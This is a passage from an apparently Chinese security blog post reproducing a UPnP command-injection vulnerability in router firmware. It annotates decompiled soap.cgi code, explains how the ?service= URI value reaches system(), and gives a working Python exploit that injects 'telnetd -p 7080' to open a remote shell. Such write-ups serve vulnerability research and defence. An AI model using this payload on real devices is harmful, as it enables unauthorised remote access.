class="line">171</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">int</span> soapcgi_main()<br>&#123;<br>  <span class="hljs-regexp">//</span> 初始化 <span class="hljs-number">v0</span> 为 <span class="hljs-number">0</span><br>  <span class="hljs-number">v0</span> = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-regexp">//</span> 调用 sub_40E6B4 函数，并将返回值赋值给 <span class="hljs-number">v1</span><br>  <span class="hljs-number">v1</span> = sub_40E6B4();<br><br>  <span class="hljs-regexp">//</span> 如果 <span class="hljs-number">v1</span> 大于等于 <span class="hljs-number">0</span>，则说明 sub_40E6B4 函数执行成功，继续执行<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-number">v1</span> &gt;= <span class="hljs-number">0</span> )<br>  &#123;<br>    <span class="hljs-regexp">//</span> 获取环境变量 <span class="hljs-string">&quot;CONTENT_TYPE&quot;</span> 的值，并将返回值赋值给 <span class="hljs-number">v2</span><br>    <span class="hljs-number">v2</span> = getenv(<span class="hljs-string">&quot;CONTENT_TYPE&quot;</span>);<br>    <span class="hljs-regexp">//</span> 获取环境变量 <span class="hljs-string">&quot;REQUEST_URI&quot;</span> 的值，并将返回值赋值给 <span class="hljs-number">v3</span><br>    <span class="hljs-number">v3</span> = getenv(<span class="hljs-string">&quot;REQUEST_URI&quot;</span>);<br>    <span class="hljs-regexp">//</span> 获取环境变量 <span class="hljs-string">&quot;HTTP_SOAPACTION&quot;</span> 的值，并将返回值赋值给 <span class="hljs-number">v4</span><br>    <span class="hljs-number">v4</span> = getenv(<span class="hljs-string">&quot;HTTP_SOAPACTION&quot;</span>);<br>    <span class="hljs-regexp">//</span> 获取环境变量 <span class="hljs-string">&quot;REQUEST_METHOD&quot;</span> 的值，并将返回值赋值给 <span class="hljs-number">v5</span><br>    <span class="hljs-number">v5</span> = getenv(<span class="hljs-string">&quot;REQUEST_METHOD&quot;</span>);<br><br>    <span class="hljs-regexp">//</span> 检查 <span class="hljs-number">v2</span> 是否存在，以及 <span class="hljs-number">v2</span> 的前 <span class="hljs-number">8</span> 个字符是否与 <span class="hljs-string">&quot;text/xml&quot;</span> 相同，如果满足条件则继续执行<br>    <span class="hljs-keyword">if</span> ( <span class="hljs-number">v2</span> &amp;&amp; !strncasecmp(<span class="hljs-number">v2</span>, <span class="hljs-string">&quot;text/xml&quot;</span>, 8u) )<br>    &#123;<br>      <span class="hljs-regexp">//</span> 检查 <span class="hljs-number">v3</span> 是否存在，如果不存在则跳转到 LABEL_21<br>      <span class="hljs-keyword">if</span> ( !<span class="hljs-number">v3</span> )<br>        <span class="hljs-keyword">goto</span> LABEL_21;<br><br>      <span class="hljs-regexp">//</span> 检查 <span class="hljs-number">v4</span> 是否存在，如果不存在则跳转到 LABEL_21<br>      <span class="hljs-keyword">if</span> ( !<span class="hljs-number">v4</span> )<br>        <span class="hljs-keyword">goto</span> LABEL_21;<br><br>      <span class="hljs-regexp">//</span> 在 <span class="hljs-number">v3</span> 中查找字符 <span class="hljs-string">&#x27;?&#x27;</span>, 并将返回值赋值给 <span class="hljs-number">v9</span><br>      <span class="hljs-number">v9</span> = strchr(<span class="hljs-number">v3</span>, <span class="hljs-number">63</span>);<br>      <span class="hljs-regexp">//</span> 将 <span class="hljs-number">v9</span> 赋值给 <span class="hljs-number">v10</span><br>      <span class="hljs-number">v10</span> = <span class="hljs-number">v9</span>;<br><br>      <span class="hljs-regexp">//</span> 检查 <span class="hljs-number">v9</span> 是否为 NULL，以及 <span class="hljs-number">v9</span> 的前 <span class="hljs-number">9</span> 个字符是否与 <span class="hljs-string">&quot;?service=&quot;</span> 相同，如果满足条件则继续执行<br>      <span class="hljs-keyword">if</span> ( !<span class="hljs-number">v9</span> || strncmp(<span class="hljs-number">v9</span>, <span class="hljs-string">&quot;?service=&quot;</span>, 9u) )<br>        <span class="hljs-keyword">goto</span> LABEL_21;<br><br>      <span class="hljs-regexp">//</span> 获取 <span class="hljs-number">v4</span> 字符串的最后一个字符的地址，并将其赋值给 <span class="hljs-number">v11</span><br>      <span class="hljs-number">v11</span> = &amp;<span class="hljs-number">v4</span>[strlen(<span class="hljs-number">v4</span>) - <span class="hljs-number">1</span>];<br><br>      <span class="hljs-regexp">//</span> 检查 <span class="hljs-number">v11</span> 指向的字符是否为 <span class="hljs-string">&#x27;&quot;&#x27;</span>，如果是则将其设置为 <span class="hljs-number">0</span><br>      <span class="hljs-keyword">if</span> ( *<span class="hljs-number">v11</span> == <span class="hljs-number">34</span> )<br>        *<span class="hljs-number">v11</span> = <span class="hljs-number">0</span>;<br><br>      <span class="hljs-regexp">//</span> 获取 <span class="hljs-number">v4</span> 字符串中第一个 <span class="hljs-string">&#x27;&quot;&#x27;</span> 字符之后的地址，并将其赋值给 <span class="hljs-number">v12</span><br>      <span class="hljs-number">v12</span> = &amp;<span class="hljs-number">v4</span>[*<span class="hljs-number">v4</span> == <span class="hljs-number">0x22</span>];<br><br>      <span class="hljs-regexp">//</span> 在 <span class="hljs-number">v12</span> 中查找字符 <span class="hljs-string">&#x27;#&#x27;</span>, 并将返回值赋值给 <span class="hljs-number">v13</span><br>      <span class="hljs-number">v13</span> = strchr(<span class="hljs-number">v12</span>, <span class="hljs-number">35</span>);<br>      <span class="hljs-regexp">//</span> 将 <span class="hljs-number">v13</span> 转换为整数，并赋值给 dword_439100<br>      dword_439100 = (<span class="hljs-keyword">int</span>)<span class="hljs-number">v13</span>;<br><br>      <span class="hljs-regexp">//</span> 检查 <span class="hljs-number">v13</span> 是否为 NULL，如果为 NULL 则跳转到 LABEL_21<br>      <span class="hljs-keyword">if</span> ( !<span class="hljs-number">v13</span> )<br>      &#123;<br>LABEL_21:<br>        <span class="hljs-regexp">//</span> 将 <span class="hljs-number">v0</span> 设置为 -<span class="hljs-number">1</span><br>        <span class="hljs-number">v0</span> = -<span class="hljs-number">1</span>;<br>        <span class="hljs-regexp">//</span> 跳转到 LABEL_22<br>        <span class="hljs-keyword">goto</span> LABEL_22;<br>      &#125;<br><br>      // 将 <span class="hljs-number">v13</span> 指向的字符设置为 <span class="hljs-number">0</span><br>      *<span class="hljs-number">v13</span> = <span class="hljs-number">0</span>;<br>      <span class="hljs-regexp">//</span> 将 <span class="hljs-number">v13</span> 加 <span class="hljs-number">1</span>，并转换为整数，赋值给 dword_439100<br>      dword_439100 = (<span class="hljs-keyword">int</span>)(<span class="hljs-number">v13</span> + <span class="hljs-number">1</span>);<br><br>      <span class="hljs-regexp">//</span> 检查 <span class="hljs-number">v5</span> 是否与 <span class="hljs-string">&quot;POST&quot;</span> 相同，如果相同则继续执行<br>      <span class="hljs-keyword">if</span> ( !strcasecmp(<span class="hljs-number">v5</span>, <span class="hljs-string">&quot;POST&quot;</span>) )<br>      &#123;<br>        <span class="hljs-regexp">//</span> 将 <span class="hljs-number">v10</span> 加 <span class="hljs-number">9</span>，并将其赋值给 <span class="hljs-number">v14</span><br>        <span class="hljs-number">v14</span> = <span class="hljs-number">v10</span> + <span class="hljs-number">9</span>;<br>        <span class="hljs-regexp">//</span> 获取当前进程的 ID，并将其赋值给 <span class="hljs-number">v15</span><br>        <span class="hljs-number">v15</span> = getpid();<br>        <span class="hljs-regexp">//</span> 使用 <span class="hljs-keyword">sprintf</span> 函数将字符串 <span class="hljs-string">&quot;/runtime/services/upnp/pid<span class="hljs-variable">%d</span>&quot;</span> 格式化为字符串，并将其赋值给 byte_437CC0<br>        <span class="hljs-keyword">sprintf</span>(byte_437CC0, <span class="hljs-string">&quot;<span class="hljs-variable">%s</span>/pid<span class="hljs-variable">%d</span>&quot;</span>, <span class="hljs-string">&quot;/runtime/services/upnp&quot;</span>, <span class="hljs-number">v15</span>);<br>        <span class="hljs-regexp">//</span> 调用 cgibin_parse_request 函数，参数为 sub_40E584、<span class="hljs-number">0</span> 和 <span class="hljs-number">0x10000</span><br>        cgibin_parse_request(sub_40E584, <span class="hljs-number">0</span>, <span class="hljs-number">0x10000</span>);<br>        <span class="hljs-regexp">//</span> 获取环境变量 <span class="hljs-string">&quot;SERVER_ID&quot;</span> 的值，并将其赋值给 <span class="hljs-number">v16</span><br>        <span class="hljs-number">v16</span> = getenv(<span class="hljs-string">&quot;SERVER_ID&quot;</span>);<br>        <span class="hljs-regexp">//</span> 将 dword_439100 转换为 const char* 类型，并将其赋值给 <span class="hljs-number">v17</span><br>        <span class="hljs-number">v17</span> = (const char *)dword_439100;<br>        <span class="hljs-regexp">//</span> 将 <span class="hljs-number">v16</span> 赋值给 <span class="hljs-number">v19</span><br>        <span class="hljs-number">v19</span> = <span class="hljs-number">v16</span>;<br>        <span class="hljs-regexp">//</span> 获取当前进程的 ID，并将其赋值给 <span class="hljs-number">v18</span><br>        <span class="hljs-number">v18</span> = getpid();<br>        <span class="hljs-regexp">//</span> 使用 <span class="hljs-keyword">sprintf</span> 函数将字符串 <span class="hljs-string">&quot;<span class="hljs-variable">%s</span>/ACTION.<span class="hljs-variable">%s</span>.php\nACTION_NODEBASE=<span class="hljs-variable">%s</span>\nINF_UID=<span class="hljs-variable">%s</span>\nSERVICE_TYPE=<span class="hljs-variable">%s</span>\nACTION_NAME=<span class="hljs-variable">%s</span>\nSHELL_FILE=<span class="hljs-variable">%s</span>/<span class="hljs-variable">%s</span>_<span class="hljs-variable">%d</span>.sh&quot;</span> 格式化为字符串，并将其赋值给 byte_438D00<br>        <span class="hljs-keyword">sprintf</span>(<br>          byte_438D00,<br>          <span class="hljs-string">&quot;<span class="hljs-variable">%s</span>/ACTION.<span class="hljs-variable">%s</span>.php\nACTION_NODEBASE=<span class="hljs-variable">%s</span>\nINF_UID=<span class="hljs-variable">%s</span>\nSERVICE_TYPE=<span class="hljs-variable">%s</span>\nACTION_NAME=<span class="hljs-variable">%s</span>\nSHELL_FILE=<span class="hljs-variable">%s</span>/<span class="hljs-variable">%s</span>_<span class="hljs-variable">%d</span>.sh&quot;</span>,<br>          <span class="hljs-string">&quot;/htdocs/upnp&quot;</span>,<br>          <span class="hljs-number">v14</span>,<br>          byte_437CC0,<br>          <span class="hljs-number">v19</span>,<br>          <span class="hljs-number">v12</span>,<br>          <span class="hljs-number">v17</span>,<br>          <span class="hljs-string">&quot;/var/run&quot;</span>,<br>          <span class="hljs-number">v14</span>,<br>          <span class="hljs-number">v18</span>);<br><br>        <span class="hljs-regexp">//</span> 调用 xmldbc_ephp_wb 函数，参数为 <span class="hljs-number">0</span>、<span class="hljs-number">0</span>、byte_438D00 和 byte_437D00<br>        <span class="hljs-keyword">if</span> ( !xmldbc_ephp_wb(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, byte_438D00, byte_437D00) )<br>        &#123;<br>          <span class="hljs-regexp">//</span> 检查 cgibin_fill_http_content_len 函数的返回值是否为 <span class="hljs-number">0</span>，如果为 <span class="hljs-number">0</span> 则说明函数执行失败，则打印 byte_437D00 指向的字符串<br>          <span class="hljs-keyword">if</span> ( !cgibin_fill_http_content_len(byte_437D00, <span class="hljs-number">4096</span>) )<br>            <span class="hljs-keyword">printf</span>(<span class="hljs-string">&quot;<span class="hljs-variable">%s</span>&quot;</span>, byte_437D00);<br><br>          <span class="hljs-regexp">//</span> 获取当前进程的 ID，并将其赋值给 <span class="hljs-number">v20</span><br>          <span class="hljs-number">v20</span> = getpid();<br>          <span class="hljs-regexp">//</span> 使用 <span class="hljs-keyword">sprintf</span> 函数将字符串 <span class="hljs-string">&quot;<span class="hljs-variable">%s</span>/<span class="hljs-variable">%s</span>_<span class="hljs-variable">%d</span>.sh&quot;</span> 格式化为字符串，并将其赋值给 byte_438D00<br>          <span class="hljs-keyword">sprintf</span>(byte_438D00, <span class="hljs-string">&quot;<span class="hljs-variable">%s</span>/<span class="hljs-variable">%s</span>_<span class="hljs-variable">%d</span>.sh&quot;</span>, <span class="hljs-string">&quot;/var/run&quot;</span>, <span class="hljs-number">v14</span>, <span class="hljs-number">v20</span>);<br>          <span class="hljs-regexp">//</span> 打开 byte_438D00 指向的文件，并以追加模式打开，并将返回值赋值给 <span class="hljs-number">v21</span><br>          <span class="hljs-number">v21</span> = fopen(byte_438D00, <span class="hljs-string">&quot;a+&quot;</span>);<br><br>          <span class="hljs-regexp">//</span> 检查 <span class="hljs-number">v21</span> 是否为 NULL，如果为 NULL 则说明打开文件失败，则直接执行后续代码<br>          <span class="hljs-keyword">if</span> ( <span class="hljs-number">v21</span> )<br>          &#123;<br>            <span class="hljs-regexp">//</span> 获取当前进程的 ID，并将其赋值给 <span class="hljs-number">v22</span><br>            <span class="hljs-number">v22</span> = getpid();<br>            <span class="hljs-regexp">//</span> 向 <span class="hljs-number">v21</span> 指向的文件写入字符串 <span class="hljs-string">&quot;rm -f <span class="hljs-variable">%s</span>/<span class="hljs-variable">%s</span>_<span class="hljs-variable">%d</span>.sh&quot;</span>，并使用 <span class="hljs-number">v22</span> 替换 <span class="hljs-variable">%d</span><br>            fprintf(<span class="hljs-number">v21</span>, <span class="hljs-string">&quot;rm -f <span class="hljs-variable">%s</span>/<span class="hljs-variable">%s</span>_<span class="hljs-variable">%d</span>.sh&quot;</span>, <span class="hljs-string">&quot;/var/run&quot;</span>, <span class="hljs-number">v14</span>, <span class="hljs-number">v22</span>);<br>            <span class="hljs-regexp">//</span> 关闭 <span class="hljs-number">v21</span> 指向的文件<br>            fclose(<span class="hljs-number">v21</span>);<br>            <span class="hljs-regexp">//</span> 获取当前进程的 ID，并将其赋值给 <span class="hljs-number">v23</span><br>            <span class="hljs-number">v23</span> = getpid();<br>            <span class="hljs-regexp">//</span> 使用 <span class="hljs-keyword">sprintf</span> 函数将字符串 <span class="hljs-string">&quot;sh <span class="hljs-variable">%s</span>/<span class="hljs-variable">%s</span>_<span class="hljs-variable">%d</span>.sh &gt; /dev/console &amp;&quot;</span> 格式化为字符串，并将其赋值给 byte_438D00<br>            <span class="hljs-keyword">sprintf</span>(byte_438D00, <span class="hljs-string">&quot;sh <span class="hljs-variable">%s</span>/<span class="hljs-variable">%s</span>_<span class="hljs-variable">%d</span>.sh &gt; /dev/console &amp;&quot;</span>, <span class="hljs-string">&quot;/var/run&quot;</span>, <span class="hljs-number">v14</span>, <span class="hljs-number">v23</span>);<br>            <span class="hljs-regexp">//</span> 执行 byte_438D00 指向的 shell 命令<br>            <span class="hljs-keyword">system</span>(byte_438D00);<br>          &#125;<br>        &#125;<br><br>        // 将 <span class="hljs-number">v0</span> 设置为 <span class="hljs-number">0</span><br>        <span class="hljs-number">v0</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-regexp">//</span> 调用 xmldbc_del 函数，参数为 <span class="hljs-number">0</span>、<span class="hljs-number">0</span> 和 byte_437CC0<br>        xmldbc_del(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, byte_437CC0);<br>        <span class="hljs-regexp">//</span> 跳转到 LABEL_22<br>        <span class="hljs-keyword">goto</span> LABEL_22;<br>      &#125;<br><br>      // 将 <span class="hljs-number">v7</span> 设置为空字符串<br>      <span class="hljs-number">v7</span> = <span class="hljs-string">&quot;&quot;</span>;<br>      <span class="hljs-regexp">//</span> 将 <span class="hljs-number">v8</span> 设置为 <span class="hljs-string">&quot;unsupported HTTP request&quot;</span><br>      <span class="hljs-number">v8</span> = <span class="hljs-string">&quot;unsupported HTTP request&quot;</span>;<br>      <span class="hljs-regexp">//</span> 将 <span class="hljs-number">v6</span> 设置为 <span class="hljs-number">400</span><br>      <span class="hljs-number">v6</span> = <span class="hljs-number">400</span>;<br>    &#125;<br>    // 否则，说明 CONTENT_TYPE 不为 text/xml，则将 <span class="hljs-number">v6</span> 设置为 <span class="hljs-number">415</span>，<span class="hljs-number">v7</span> 设置为 <span class="hljs-number">0</span>，<span class="hljs-number">v8</span> 设置为 <span class="hljs-number">0</span><br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-number">v6</span> = <span class="hljs-number">415</span>;<br>      <span class="hljs-number">v7</span> = <span class="hljs-number">0</span>;<br>      <span class="hljs-number">v8</span> = <span class="hljs-number">0</span>;<br>    &#125;<br><br>    // 将 <span class="hljs-number">v0</span> 设置为 -<span class="hljs-number">1</span><br>    <span class="hljs-number">v0</span> = -<span class="hljs-number">1</span>;<br>    <span class="hljs-regexp">//</span> 调用 cgibin_print_http_status 函数，参数为 <span class="hljs-number">v6</span>、<span class="hljs-number">v7</span> 和 <span class="hljs-number">v8</span><br>    cgibin_print_http_status(<span class="hljs-number">v6</span>, <span class="hljs-number">v7</span>, <span class="hljs-number">v8</span>);<br><br>LABEL_22:<br>    <span class="hljs-regexp">//</span> 调用 sub_40E7D0 函数，参数为 <span class="hljs-number">v1</span><br>    sub_40E7D0(<span class="hljs-number">v1</span>);<br>  &#125;<br><br>  // 返回 <span class="hljs-number">v0</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">v0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h5 id="代码分析："><a href="#代码分析：" class="headerlink" title="代码分析："></a><strong>代码分析：</strong></h5><p>这个函数 <code>soapcgi_main</code> 主要处理来自 UPnP 设备的 SOAP 请求，并根据请求内容执行相应的操作。</p>
+<p><strong>代码逻辑：</strong></p>
+<ol>
+<li><strong>获取环境变量：</strong> 函数首先获取几个重要的环境变量：<ul>
+<li><code>CONTENT_TYPE</code>: 请求的内容类型，用于判断是否为 XML 格式。</li>
+<li><code>REQUEST_URI</code>: 请求的 URI，用于解析请求的具体内容。</li>
+<li><code>HTTP_SOAPACTION</code>: SOAP 操作名称，用于确定要执行的操作。</li>
+<li><code>REQUEST_METHOD</code>: 请求方法，用于判断是 GET 还是 POST 请求。</li>
+</ul>
+</li>
+<li><strong>检查请求格式：</strong> 函数检查这些环境变量的值是否符合 SOAP 协议的规范，例如：<ul>
+<li>检查 <code>CONTENT_TYPE</code> 是否为 “text&#x2F;xml”。</li>
+<li>检查 <code>REQUEST_URI</code> 和 <code>HTTP_SOAPACTION</code> 是否存在。</li>
+<li>检查 <code>REQUEST_URI</code> 是否包含 “?service&#x3D;”。</li>
+<li>检查 <code>HTTP_SOAPACTION</code> 是否以 ‘“‘ 开头和结尾。</li>
+</ul>
+</li>
+<li><strong>解析 SOAP 请求：</strong> 函数解析 <code>HTTP_SOAPACTION</code> 中的 SOAP 操作名称，并根据操作名称执行相应的操作。</li>
+<li><strong>执行操作：</strong> 函数根据 SOAP 操作名称，调用不同的函数或脚本进行处理。</li>
+</ol>
+<h5 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a><strong>漏洞分析：</strong></h5><ol>
+<li><strong>用户可控输入：</strong> <code>REQUEST_URI</code> 环境变量的值是由用户控制的，攻击者可以恶意构造该环境变量的值。</li>
+<li><strong>拼接 shell 命令：</strong> 函数在处理 SOAP 请求时，会提取 <code>REQUEST_URI</code> 中的 <code>?service=</code> 后面的部分，并将其作为 SOAP 操作名称。然后，它会将该操作名称拼接进 shell 命令中，例如：<ul>
+<li><code>%s/ACTION.%s.php\nACTION_NODEBASE=%s\nINF_UID=%s\nSERVICE_TYPE=%s\nACTION_NAME=%s\nSHELL_FILE=%s/%s_%d.sh</code></li>
+</ul>
+</li>
+<li><strong>执行命令：</strong> 函数使用 <code>system</code> 函数执行拼接后的 shell 命令。</li>
+<li>综上分析可知，漏洞出现的原因是POST 的URI中<code>?service=</code>后面的内容可由输入控制，全程没有对该处输入进行检查，直接sprintf后由system函数执行。</li>
+</ol>
+<h5 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><p>根据UPnP官方文档，要调用UPnP设备上的服务，控制点必须以POST方法发送以下格式的请求</p>
+<img src="image-20240823141840975.png" srcset="/img/loading.gif" lazyload alt="image-20240823141840975" style="zoom:67%;" />
+
+<p>soap端口在49152</p>
+<img src="image-20240823143839889.png" srcset="/img/loading.gif" lazyload alt="image-20240823143839889" style="zoom: 50%;" />
+
+<img src="image-20240823143953213.png" srcset="/img/loading.gif" lazyload alt="image-20240823143953213" style="zoom: 50%;" />
+
+<p>soap.cgi可以在49152访问到</p>
+<p>exp</p>
+<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs swift">from socket <span class="hljs-keyword">import</span> *<br>from os <span class="hljs-keyword">import</span> *<br>from time <span class="hljs-keyword">import</span> *<br> <br>request <span class="hljs-operator">=</span> b<span class="hljs-string">&quot;POST /soap.cgi?service=;telnetd -p 7080 HTTP/1.1<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>&quot;</span><br>request <span class="hljs-operator">+=</span> b<span class="hljs-string">&quot;Host: 192.168.0.1:49152<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>&quot;</span><br>request <span class="hljs-operator">+=</span> b<span class="hljs-string">&quot;Content-Type: text/xml<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>&quot;</span><br>request <span class="hljs-operator">+=</span> b<span class="hljs-string">&quot;Content-Length: 200<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>&quot;</span><br>request <span class="hljs-operator">+=</span> b<span class="hljs-string">&quot;SOAPAction: <span class="hljs-subst">\&quot;</span>urn:schemas-upnp-org:service:serviceType:v#actionName<span class="hljs-subst">\&quot;</span><span class="hljs-subst">\r</span><span class="hljs-subst">\n</span><span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>&quot;</span><br><br>s <span class="hljs-operator">=</span> socket(<span class="hljs-type">AF_INET</span>, <span class="hljs-type">SOCK_STREAM</span>)<br>s.connect((gethostbyname(<span class="hljs-string">&quot;192.168.0.1&quot;</span>), <span class="hljs-number">49152</span>))<br>s.send(request)<br>  <br>sleep(<span class="hljs-number">5</span>)<br>system(&#x27;telnet <span class="hljs-number">192.168</span>.<span class="hljs-number">0.1</span> <span class="hljs-number">7080</span>&#x27;)<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240823162755843.png" srcset="/img/loading.gif" lazyload alt="image-20240823162755843"></p>
+<p>动调</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240823160953326.png" srcset="/img/loading.gif" lazyload alt="image-20240823160953326"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>upnp协议学习及漏洞复现</div>
+      <div>http://groundctl2majortom.github.io/2024/08/14/upnp协议学习及漏洞复现/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>GroundCtl2MajorTom</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年8月14日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/08/16/mqtt%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="mqtt协议学习及漏洞复现">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">mqtt协议学习及漏洞复现</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/08/10/dir-601%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90/" title="dir-601固件分析">
+                        <span class="hidden-mobile">dir-601固件分析</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
